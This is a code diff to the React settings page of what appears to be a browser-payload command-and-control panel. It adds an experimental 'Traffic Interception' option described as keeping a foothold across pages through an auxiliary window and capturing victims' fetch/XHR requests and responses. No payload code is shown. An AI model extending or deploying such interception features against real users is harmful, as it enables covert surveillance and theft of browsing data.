@@ -11,7 +11,9 @@ import {
     Save,
     Key,
     Shield,
-    Lock
+    Lock,
+    FlaskConical,
+    Radio
 } from 'lucide-react';
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
@@ -27,6 +29,7 @@ interface SettingsData {
     screenshot_enabled: string;
     persistent_enabled: string;
     persistent_key: string;
+    advanced_persistent_enabled: string;
     notes: string;
 }
 
@@ -40,6 +43,7 @@ export default function PayloadsPage() {
         screenshot_enabled: 'true',
         persistent_enabled: 'false',
         persistent_key: '',
+        advanced_persistent_enabled: 'false',
         notes: '',
     });
     const [generatingKey, setGeneratingKey] = useState(false);
@@ -60,6 +64,7 @@ export default function PayloadsPage() {
                     screenshot_enabled: data.settings.screenshot_enabled || 'true',
                     persistent_enabled: data.settings.persistent_enabled || 'false',
                     persistent_key: data.settings.persistent_key || '',
+                    advanced_persistent_enabled: data.settings.advanced_persistent_enabled || 'false',
                     notes: data.settings.notes || '',
                 });
             }
@@ -289,6 +294,49 @@ export default function PayloadsPage() {
                                         Encryption enabled - commands &amp; responses are protected
                                     </p>
                                 )}
+
+                                {/* Traffic Interception Mode */}
+                                <div className="border-t border-white/5 pt-4 mt-4">
+                                    <div className="flex items-center justify-between">
+                                        <div className="space-y-0.5">
+                                            <div className="flex items-center gap-2">
+                                                <h3 className="font-medium text-sm">Traffic Interception</h3>
+                                                <Badge variant="secondary" className="text-xs h-5 px-1.5 bg-amber-500/10 text-amber-400 hover:bg-amber-500/20 border-none">
+                                                    <FlaskConical className="w-3 h-3 mr-1" />
+                                                    Experimental
+                                                </Badge>
+                                            </div>
+                                            <p className="text-sm text-muted-foreground">
+                                                Multi-page persistence with network request capture
+                                            </p>
+                                        </div>
+                                        <Switch
+                                            checked={settings.advanced_persistent_enabled === 'true'}
+                                            onCheckedChange={() => toggleSetting('advanced_persistent_enabled')}
+                                        />
+                                    </div>
+
+                                    {/* Feature list when enabled */}
+                                    {settings.advanced_persistent_enabled === 'true' && (
+                                        <div className="mt-3 ml-1 pl-3 border-l border-amber-500/30 space-y-2">
+                                            <div className="flex items-center gap-2 text-sm text-muted-foreground">
+                                                <Radio className="w-3.5 h-3.5 text-amber-400" />
+                                                <span>Auxiliary window for cross-page persistence</span>
+                                            </div>
+                                            <div className="flex items-center gap-2 text-sm text-muted-foreground">
+                                                <Radio className="w-3.5 h-3.5 text-amber-400" />
+                                                <span>Auto-intercept fetch/XHR requests</span>
+                                            </div>
+                                            <div className="flex items-center gap-2 text-sm text-muted-foreground">
+                                                <Radio className="w-3.5 h-3.5 text-amber-400" />
+                                                <span>Capture request/response data in real-time</span>
+                                            </div>
+                                            <p className="text-xs text-amber-400/70 mt-2">
+                                                ⚠️ Requires user interaction. May be blocked by popup blockers.
+                                            </p>
+                                        </div>
+                                    )}
+                                </div>
                             </div>
                         )}
 
